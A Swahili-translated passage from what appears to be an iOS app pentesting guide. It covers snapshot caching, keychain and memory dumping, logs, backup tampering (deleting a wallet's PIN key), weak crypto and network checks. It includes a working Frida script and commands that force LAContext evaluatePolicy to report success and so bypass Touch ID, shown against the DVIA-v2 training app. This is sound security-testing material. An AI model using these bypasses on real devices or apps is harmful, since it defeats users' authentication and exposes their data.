Kila unapobonyeza kitufe cha nyumbani, iOS **inachukua picha ya skrini ya sasa** ili kuweza kufanya mpito kwenye programu kwa njia laini zaidi. Walakini, ikiwa **data nyeti** iko kwenye skrini ya sasa, itahifadhiwa kwenye **picha** (ambayo **inaendelea** **hata** **baada** **ya** **kuzima** **na** **kuwasha** **tena**). Hizi ni picha za skrini ambazo unaweza pia kufikia kwa kubonyeza mara mbili skrini ya nyumbani ili kubadilisha programu.

Isipokuwa iPhone imefunguliwa, **mshambuliaji** anahitaji kuwa na **upatikanaji** wa **kifaa** **bila** **kizuizi** ili kuona picha hizi. Kwa chaguo-msingi picha ya skrini ya mwisho inahifadhiwa kwenye sanduku la programu katika `Library/Caches/Snapshots/` au saraka ya `Library/SplashBoard/Snapshots` (kompyuta za kuaminika haziwezi kupata mfumo wa faili kutoka iOX 7.0).

Njia moja ya kuzuia tabia hii mbaya ni kuweka skrini tupu au kuondoa data nyeti kabla ya kuchukua picha ya skrini kwa kutumia kazi ya `ApplicationDidEnterBackground()`.

Hapa chini ni mfano wa njia ya kurekebisha ambayo itaweka picha ya skrini ya chaguo-msingi.

Swift:

```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```

**Lengo-C:**

```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```

Hii inaweka picha ya mandharinyuma kuwa `overlayImage.png` wakati programu inapokuwa nyuma. Inazuia uvujaji wa data nyeti kwa sababu `overlayImage.png` itapitisha daima maoni ya sasa.

### Keychain

Kwa kupata na kusimamia keychain ya iOS, zana kama [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) zinapatikana, zinazofaa kwa vifaa vilivyovunjwa. Kwa kuongezea, [**Objection**](https://github.com/sensepost/objection) hutoa amri `ios keychain dump` kwa madhumuni sawa.

#### **Kuhifadhi Sifa**

Darasa la **NSURLCredential** ni bora kwa kuhifadhi habari nyeti moja kwa moja kwenye keychain, ikipuuza haja ya NSUserDefaults au vifungashio vingine. Kuhifadhi sifa baada ya kuingia, namna ifuatayo ya kanuni ya Swift hutumiwa:

```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```

Kuondoa siri hizi zilizohifadhiwa, amri ya Objection `ios nsurlcredentialstorage dump` hutumiwa.

## **Vidakuzi vya Kibodi Maalum na Kache ya Kibodi**

Kuanzia iOS 8.0 kuendelea, watumiaji wanaweza kusakinisha nyongeza za kibodi maalum, ambazo zinaweza kusimamiwa chini ya **Vipimo > Jumla > Kibodi > Kibodi**. Ingawa kibodi hizi zinatoa utendaji mpana, zinaweza kuleta hatari ya kurekodi taratibu za kubonyeza funguo na kutuma data kwa seva za nje, ingawa watumiaji huarifiwa kuhusu kibodi zinazohitaji ufikivu wa mtandao. Programu zinaweza, na zinapaswa, kuzuia matumizi ya kibodi maalum kwa kuingiza taarifa nyeti.

**Mapendekezo ya Usalama:**

* Inashauriwa kulemaza kibodi za watu wa tatu kwa usalama bora.
* Kuwa makini na vipengele vya kurekebisha moja kwa moja na mapendekezo ya moja kwa moja ya kibodi ya msingi ya iOS, ambayo yanaweza kuhifadhi taarifa nyeti katika faili za kache zilizoko katika `Library/Keyboard/{locale}-dynamic-text.dat` au `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. Faili hizi za kache zinapaswa kuangaliwa mara kwa mara kwa data nyeti. Kuweka upya kamusi ya kibodi kupitia **Vipimo > Jumla > Rudisha > Rudisha Kamusi ya Kibodi** kunapendekezwa kwa kusafisha data iliyohifadhiwa kwenye kache.
* Kukamata trafiki ya mtandao kunaweza kufichua ikiwa kibodi maalum inatuma taratibu za kubonyeza funguo kijijini.

### **Kuzuia Kache ya Uwanja wa Maandishi**

Itifaki ya [UITextInputTraits](https://developer.apple.com/reference/uikit/uitextinputtraits) inatoa mali kusimamia kurekebisha moja kwa moja na kuingiza maandishi salama, muhimu kwa kuzuia kuhifadhi taarifa nyeti. Kwa mfano, kulemaza kurekebisha moja kwa moja na kuwezesha kuingiza maandishi salama kunaweza kufikiwa na:

```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```

Kwa kuongezea, waendelezaji wanapaswa kuhakikisha kuwa maeneo ya maandishi, hasa yale ya kuingiza habari nyeti kama nywila na PIN, yanalemaza kuhifadhiwa kwa kuweka `autocorrectionType` kuwa `UITextAutocorrectionTypeNo` na `secureTextEntry` kuwa `YES`.

```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```

## **Kumbukumbu**

Kutatua hitilafu za nambari mara nyingi kunahusisha matumizi ya **kumbukumbu**. Kuna hatari kwani **kumbukumbu inaweza kuwa na habari nyeti**. Awali, katika iOS 6 na toleo za awali, kumbukumbu zilikuwa zinapatikana kwa programu zote, ikileta hatari ya kuvuja kwa data nyeti. **Sasa, programu zimeruhusiwa kufikia tu kumbukumbu zao**.

Licha ya vizuizi hivi, **mshambuliaji mwenye ufikiaji wa kimwili** kwenye kifaa kilichofunguliwa bado anaweza kutumia hili kwa kuunganisha kifaa kwenye kompyuta na **kusoma kumbukumbu**. Ni muhimu kutambua kwamba kumbukumbu zinabaki kwenye diski hata baada ya programu kuondolewa.

Ili kupunguza hatari, inashauriwa **kuingiliana kikamilifu na programu**, kuchunguza kwa undani kazi zake zote na matokeo yake ili kuhakikisha hakuna habari nyeti inayorekodiwa kwa bahati mbaya.

Unapopitia nambari ya chanzo cha programu kwa kuvuja kwa uwezekano, tafuta **maelezo yaliyowekwa mapema** na **maelezo ya kumbukumbu ya desturi** kwa kutumia maneno kama `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` kwa kazi zilizojengwa, na maelezo yoyote ya `Logging` au `Logfile` kwa utekelezaji wa desturi.

### **Kufuatilia Kumbukumbu za Mfumo**

Programu hurekodi vipande mbalimbali vya habari ambavyo vinaweza kuwa nyeti. Ili kufuatilia kumbukumbu hizi, zana na amri kama:

```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```

Pia, **Xcode** inatoa njia ya kukusanya magogo ya konsoli:

1. Fungua Xcode.
2. Unganisha kifaa cha iOS.
3. Nenda kwa **Window** -> **Vifaa na Simulizi**.
4. Chagua kifaa chako.
5. Chochote kisababishacho tatizo unalochunguza.
6. Tumia kitufe cha **Fungua Konsoli** kuona magogo kwenye dirisha jipya.

Kwa kuingia kwa kina zaidi, kuunganisha kwa ganda la kifaa na kutumia **socat** inaweza kutoa ufuatiliaji wa muda halisi wa magogo:

```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```

Kufuatia amri za kuangalia shughuli za logi, ambazo zinaweza kuwa na thamani kubwa kwa kugundua matatizo au kutambua uwezekano wa uvujaji wa data katika logi.

***

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia mifumo ya kazi** kwa urahisi ikiwa na zana za jamii **za juu kabisa** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Nakala za Usalama

**Vipengele vya kiotomatiki vya nakala za usalama** vimejumuishwa katika iOS, kurahisisha uundaji wa nakala za data za kifaa kupitia iTunes (hadi macOS Catalina), Finder (kuanzia macOS Catalina kuendelea), au iCloud. Nakala hizi zinajumuisha karibu data yote ya kifaa, isipokuwa vipengele vyenye hisia kali kama maelezo ya Apple Pay na mipangilio ya Touch ID.

### Hatari za Usalama

Kujumuishwa kwa **programu zilizosakinishwa na data zao** katika nakala za usalama kunazua suala la **uvujaji wa data** na hatari kwamba **marekebisho ya nakala za usalama yanaweza kubadilisha utendaji wa programu**. Inashauriwa **kutosha kuhifadhi habari nyeti kwa maandishi wazi** ndani ya saraka yoyote ya programu au saraka zake za sekondari ili kupunguza hatari hizi.

### Kutoa Pasi za Nakala za Usalama

Faili katika `Documents/` na `Library/Application Support/` zinanakiliwa kwa chaguo-msingi. Watengenezaji wanaweza kutoa faili au saraka maalum kutoka kwa nakala za usalama kwa kutumia `NSURL setResourceValue:forKey:error:` na `NSURLIsExcludedFromBackupKey`. Mazoea haya ni muhimu kwa kulinda data nyeti isijumuishwe katika nakala za usalama.

### Kupima Kwa Mapungufu ya Usalama

Kutathmini usalama wa nakala za programu, anza kwa **kuunda nakala ya usalama** kwa kutumia Finder, kisha ipate kwa kufuata mwongozo kutoka [hati ya rasmi ya Apple](https://support.apple.com/en-us/HT204215). Changanya nakala ya usalama kwa data nyeti au mipangilio ambayo inaweza kubadilishwa kwa kudhuru utendaji wa programu.

Taarifa nyeti inaweza kutafutwa kwa kutumia zana za mstari wa amri au programu kama [iMazing](https://imazing.com). Kwa nakala za usalama zilizo na nenosiri, uwepo wa kificho cha siri unaweza kudhibitishwa kwa kuangalia kifunguo cha "IsEncrypted" katika faili ya "Manifest.plist" kwenye mzizi wa nakala ya usalama.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```

Kwa kushughulikia nakala rudufu zilizo na usimbaji, hati za Python zinapatikana kwenye [repo ya GitHub ya DinoSec](https://github.com/dinosec/iphone-dataprotection/tree/master/python\_scripts), kama vile **backup\_tool.py** na **backup\_passwd.py**, zinaweza kuwa na manufaa, ingawa inaweza kuhitaji marekebisho kwa utangamano na toleo jipya la iTunes/Finder. Zana ya [**iOSbackup**](https://pypi.org/project/iOSbackup/) ni chaguo lingine kwa kupata faili ndani ya nakala rudufu zilizolindwa kwa nenosiri.

### Kubadilisha Tabia ya Programu

Mfano wa kubadilisha tabia ya programu kupitia marekebisho ya nakala rudufu unaonyeshwa katika programu ya mkoba wa bitcoin ya [Bither](https://github.com/bither/bither-ios), ambapo PIN ya kufunga UI imehifadhiwa ndani ya `net.bither.plist` chini ya ufunguo wa **pin\_code**. Kuondoa ufunguo huu kutoka kwa plist na kurejesha nakala rudufu kunatoa mahitaji ya PIN, ikitoa ufikiaji usiozuiliwa.

## Muhtasari wa Ukaguzi wa Kumbukumbu kwa Data Nyeti

Kuwa na data nyeti iliyohifadhiwa katika kumbukumbu ya programu, ni muhimu kupunguza muda wa kufichua data hii. Kuna njia mbili kuu za kuchunguza maudhui ya kumbukumbu: **kuunda nakala ya kumbukumbu** na **kuchambua kumbukumbu wakati halisi**. Njia zote zina changamoto zake, ikiwa ni pamoja na uwezekano wa kukosa data muhimu wakati wa mchakato wa nakala au uchambuzi.

## **Kupata na Kuchambua Nakala ya Kumbukumbu**

Kwa vifaa vilivyovunjwa na visivyo vunjwa, zana kama [objection](https://github.com/sensepost/objection) na [Fridump](https://github.com/Nightbringer21/fridump) huruhusu kwa kudondosha kumbukumbu ya mchakato wa programu. Mara baada ya kudondosha, kuchambua data hii kunahitaji zana mbalimbali, kulingana na asili ya habari unayotafuta.

Kuondoa maneno kutoka kwa nakala ya kumbukumbu, amri kama vile `strings` au `rabin2 -zz` zinaweza kutumika:

```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```

Kwa uchambuzi wa kina zaidi, ikiwa ni pamoja na kutafuta aina maalum za data au mifano, **radare2** inatoa uwezo mkubwa wa kutafuta:

```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```

## **Uchambuzi wa Kumbukumbu ya Wakati wa Uendeshaji**

**r2frida** hutoa mbadala hodari kwa kuchunguza kumbukumbu ya programu kwa wakati halisi, bila kuhitaji kumbukumbu ya kumbukumbu. Zana hii inawezesha utekelezaji wa amri za utafutaji moja kwa moja kwenye kumbukumbu ya programu inayoendeshwa:

```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```

## Ufichamishaji wa Cryptography

### Mchakato Duni wa Usimamizi wa Funguo

Baadhi ya watengenezaji huficha data nyeti kwenye hifadhi ya ndani na kuiweka kwenye funguo zilizowekwa/kutabirika kwenye nambari. Hii haipaswi kufanywa kwani baadhi ya kugeuza inaweza kuruhusu wachomaji kutoa habari za siri.

### Matumizi ya Algorithms Zisizo Salama na/au Zilizopitwa na Wakati

Watengenezaji hawapaswi kutumia **algorithms zilizopitwa na wakati** kufanya **uchunguzi wa idhini**, **kuhifadhi** au **kupeleka** data. Baadhi ya algorithms hizi ni: RC4, MD4, MD5, SHA1... Ikiwa **hashes** hutumiwa kuhifadhi nywila kwa mfano, hashes zenye **upinzani** dhidi ya nguvu za brute zinapaswa kutumika na chumvi.

### Ukaguzi

Ukaguzi muhimu wa kufanya ni kutafuta ikiwa unaweza kupata nywila/siri zilizowekwa kwenye nambari, au ikiwa hizo ni **zilizotabirika**, na ikiwa nambari inatumia aina fulani ya algorithms za **cryptography** **dhaifu**.

Ni ya kuvutia kujua kwamba unaweza **kuangalia** baadhi ya **maktaba za crypto** kiotomatiki kwa kutumia **objection** na:

```swift
ios monitor crypt
```

Kwa **maelezo zaidi** kuhusu APIs na maktaba za kryptografia za iOS tembelea [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Uthibitishaji wa Kienyeji

**Uthibitishaji wa kienyeji** unacheza jukumu muhimu, hasa linapohusu kulinda ufikiaji kwenye mwisho wa mbali kupitia njia za kryptografia. Kiini hapa ni kwamba bila utekelezaji sahihi, mifumo ya uthibitishaji wa kienyeji inaweza kuzungukwa.

[**Mfumo wa Uthibitishaji wa Kienyeji**](https://developer.apple.com/documentation/localauthentication) wa Apple na [**keychain**](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) hutoa APIs imara kwa watengenezaji kurahisisha mazungumzo ya uthibitishaji wa mtumiaji na kushughulikia kwa usalama data za siri, mtawalia. Enclave Salama inalinda kitambulisho cha kidole kwa Touch ID, wakati Face ID inategemea kutambua uso bila kuhatarisha data ya kibaiometriki.

Kuongeza Touch ID/Face ID, watengenezaji wana chaguo la API mbili:

* **`LocalAuthentication.framework`** kwa uthibitishaji wa mtumiaji wa kiwango cha juu bila ufikiaji wa data ya kibaiometriki.
* **`Security.framework`** kwa ufikiaji wa huduma za keychain za kiwango cha chini, kuhifadhi data za siri kwa uthibitishaji wa kibaiometriki. Vifuniko vya chanzo wazi mbalimbali hufanya ufikiaji wa keychain kuwa rahisi.

{% hint style="danger" %}
Hata hivyo, `LocalAuthentication.framework` na `Security.framework` zinaonyesha mapungufu, kwani kimsingi hurejesha thamani za boolean bila kuhamisha data kwa mchakato wa uthibitishaji, hivyo kuwafanya kuwa rahisi kuzungukwa (rejea [Usiniguse hivyo, na David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Kutekeleza Uthibitishaji wa Kienyeji

Ili kuwahimiza watumiaji kwa uthibitishaji, watengenezaji wanapaswa kutumia njia ya **`evaluatePolicy`** ndani ya darasa la **`LAContext`**, kuchagua kati ya:

* **`deviceOwnerAuthentication`**: Inahimiza Touch ID au nambari ya kifaa, ikishindwa ikiwa hakuna mojawapo imezimwa.
* **`deviceOwnerAuthenticationWithBiometrics`**: Inahimiza pekee Touch ID.

Uthibitishaji wa mafanikio unadhihirishwa na thamani ya boolean kutoka kwa **`evaluatePolicy`**, ikionyesha kasoro ya usalama inayowezekana.

### Uthibitishaji wa Kienyeji kwa Kutumia Keychain

Kutekeleza **uthibitishaji wa kienyeji** kwenye programu za iOS kunahusisha matumizi ya **keychain APIs** kuhifadhi data za siri kwa usalama kama vile vibali vya uthibitishaji. Mchakato huu unahakikisha kwamba data inaweza kupatikana tu na mtumiaji, kwa kutumia nambari ya kifaa au uthibitishaji wa kibaiometriki kama vile Touch ID.

Keychain inatoa uwezo wa kuweka vitu na sifa ya `SecAccessControl`, ambayo inazuia ufikiaji wa kitu hadi mtumiaji athibitishe kwa mafanikio kupitia Touch ID au nambari ya kifaa. Kipengele hiki ni muhimu kwa kuboresha usalama.

Hapa chini ni mifano ya nambari katika Swift na Objective-C inayoonyesha jinsi ya kuokoa na kurejesha herufi kutoka/kwenye keychain, kwa kutumia vipengele hivi vya usalama. Mifano husika inaonyesha hasa jinsi ya kuweka udhibiti wa ufikiaji ili kuhitaji uthibitishaji wa Touch ID na kuhakikisha data inapatikana tu kwenye kifaa kilichowekwa, chini ya hali kwamba nambari ya kifaa imeundwa.

```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```

#### Kuchunguza Programu za iOS

Kuchunguza programu za iOS kunahitaji ufahamu wa maendeleo ya programu za iOS na mbinu za kawaida za usalama. Kwa kutumia zana kama vile **Cycript** au **Frida**, unaweza kuchambua programu za iOS moja kwa moja kwenye kifaa chako cha iOS ili kugundua udhaifu au mapungufu ya usalama. Pia, kuchunguza mwingiliano wa mtandao wa programu na kugundua jinsi programu inavyoshughulikia data ni muhimu katika mchakato wa kuchunguza programu za iOS.

Kwa kufuata mbinu hizi, unaweza kubaini mapungufu ya usalama katika programu za iOS na kusaidia kuboresha usalama wao.

#### Kuchunguza Mwingiliano wa Mtandao

Kuchunguza mwingiliano wa mtandao wa programu za iOS kunahusisha kufuatilia na kuchambua mawasiliano ya mtandao yanayofanywa na programu. Unaweza kutumia zana kama vile **Burp Suite** au **Charles Proxy** kusaidia katika kufuatilia na kuchambua trafiki ya mtandao inayotoka na kuingia kwenye programu ya iOS. Kwa kufanya hivyo, unaweza kugundua ikiwa kuna mawasiliano yasiyo salama au ya kutiliwa shaka yanayofanywa na programu.

Kwa kufuata mbinu hizi, unaweza kubaini hatari za usalama zinazohusiana na mwingiliano wa mtandao wa programu za iOS na kuchukua hatua za kurekebisha mapungufu hayo.

#### Kuchunguza Uhifadhi wa Data

Kuchunguza jinsi programu za iOS zinavyoshughulikia na kuhifadhi data ni muhimu katika kubaini mapungufu ya usalama. Kwa kutumia zana kama vile **iExplorer** au **iFunBox**, unaweza kuchunguza data iliyohifadhiwa kwenye kifaa cha iOS na kubaini ikiwa kuna hatari ya data kuibiwa au kuvuja. Pia, kuchambua jinsi data inavyohifadhiwa kwenye seva au huduma za mtandao zinazotumiwa na programu ni muhimu katika mchakato wa kuchunguza uhifadhi wa data wa programu za iOS.

Kwa kufuata mbinu hizi, unaweza kubaini mapungufu ya usalama yanayohusiana na uhifadhi wa data katika programu za iOS na kuchukua hatua za kuzuia data kuvuja au kuibiwa.

#### Hitimisho

Kuchunguza programu za iOS ni mchakato muhimu katika kuboresha usalama wa programu hizo. Kwa kufuata mbinu sahihi za kuchunguza mwingiliano wa mtandao na uhifadhi wa data, unaweza kugundua na kurekebisha mapungufu ya usalama katika programu za iOS, hivyo kuzifanya kuwa imara zaidi na salama kwa watumiaji.

```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```

Sasa tunaweza kuomba kipengee kilichohifadhiwa kutoka kwa keychain. Huduma za keychain zitatoa dirisha la uthibitisho kwa mtumiaji na kurudisha data au nil kulingana na ikiwa kidole cha kutosha kilichotolewa au la.

```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```



```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```

### Uchunguzi

Matumizi ya fremu katika programu yanaweza pia kugunduliwa kwa kuchambua orodha ya maktaba za kushirikiana za programu ya binary. Hii inaweza kufanywa kwa kutumia `otool`:

```bash
$ otool -L <AppName>.app/<AppName>
```

Ikiwa `LocalAuthentication.framework` inatumika kwenye programu, matokeo yatakuwa na mistari yote ifuatayo (kumbuka kuwa `LocalAuthentication.framework` inatumia `Security.framework` chini ya pazia):

```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```

Ikiwa inatumika `Security.framework`, itaonyeshwa tu ya pili.

### Kupuuza Kitendaji cha Uhakiki wa Lokali

#### **Objection**

Kupitia **Objection Biometrics Bypass**, iliyoko kwenye [ukurasa huu wa GitHub](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass), mbinu inapatikana ya kushinda mfumo wa **LocalAuthentication**. Msingi wa mbinu hii ni kutumia **Frida** kubadilisha kitendaji cha `evaluatePolicy`, kuhakikisha kuwa daima inatoa matokeo ya `True`, bila kujali mafanikio halisi ya uhakiki. Hii ni muhimu sana kwa kuzunguka michakato dhaifu ya uhakiki wa kibaiolojia.

Kuamsha kipengele hiki cha kupuuza, amri ifuatayo hutumiwa:

```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```

Hii amri inaanzisha mfululizo ambapo Objection inasajili kazi ambayo inabadilisha matokeo ya ukaguzi wa `evaluatePolicy` kuwa `True`.

#### Frida

Mfano wa matumizi ya **`evaluatePolicy`** kutoka [programu ya DVIA-v2](https://github.com/prateek147/DVIA-v2):

```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```

Kufikia **kipuuzi** wa Uthibitishaji wa Kienyeji, hati ya Frida imeandikwa. Hati hii inalenga ukaguzi wa **evaluatePolicy**, ikikamata simu yake ili kuhakikisha inarudi **mafanikio=1**. Kwa kubadilisha tabia ya simu hiyo, ukaguzi wa uthibitishaji unapuuzwa kwa ufanisi.

Hati ifuatayo imeingizwa kubadilisha matokeo ya mbinu ya **evaluatePolicy**. Inabadilisha matokeo ya simu hiyo ili iashirie mafanikio daima.

```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```

Kutuma script ya Frida na kuzidisha uthibitishaji wa kibaolojia, tumia amri ifuatayo:

```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```

## Kufichua Kazi Nyeti Kupitia IPC

### Wachukuaji wa URI za Desturi / Viungo vya Kina / Mbinu za Desturi

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Viungo vya Kina

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### Kugawana Kupitia UIActivity

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Vipanuzi vya Programu

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Ufananuzi na Ufichamishi

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Mawasiliano ya Mtandao

Ni muhimu kuhakikisha kuwa hakuna mawasiliano yanayotokea **bila encryption** na pia kwamba programu inathibitisha kwa usahihi **uthibitisho wa cheti cha TLS** cha seva.\
Kutathmini masuala kama haya unaweza kutumia proksi kama **Burp**:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Ukaguzi wa Jina la Mwenyeji

Moja ya shida za kawaida katika kuthibitisha cheti cha TLS ni kuhakikisha kuwa cheti kilisainiwa na **CA iliyosadikika**, lakini **isiangalii** ikiwa **jina la mwenyeji** wa cheti ni jina la mwenyeji linalofikiwa.\
Ili kuchunguza shida hii kwa kutumia Burp, baada ya kuamini CA ya Burp kwenye iPhone, unaweza **kuunda cheti kipya na Burp kwa jina la mwenyeji tofauti** na kulitumia. Ikiwa programu bado inafanya kazi, basi, kuna udhaifu fulani.

### Kufunga Cheti

Ikiwa programu inatumia Kufunga SSL kwa usahihi, basi programu itafanya kazi tu ikiwa cheti ni lile linalotarajiwa. Wakati wa kufanya majaribio kwenye programu **hii inaweza kuwa shida kwani Burp itahudumia cheti chake.**\
